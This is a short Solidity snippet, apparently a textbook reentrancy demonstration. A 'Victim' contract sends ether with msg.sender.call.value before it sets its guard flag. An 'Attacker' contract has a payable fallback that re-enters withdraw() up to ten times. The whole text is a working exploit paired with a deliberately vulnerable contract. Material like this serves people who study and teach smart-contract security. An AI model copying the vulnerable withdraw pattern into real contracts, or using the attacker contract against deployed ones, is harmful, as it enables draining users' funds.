contract Victim {
   bool flag =false;
   function withdraw() {
   if (flag || !msg.sender.call.value(1 wei)())throw;
   flag =true;
  }
 }
 
 contract Attacker {
   uint count = 0;
   function() payable{
     if(++count < 10) Victim(msg.sender).withdraw();
   }
 }
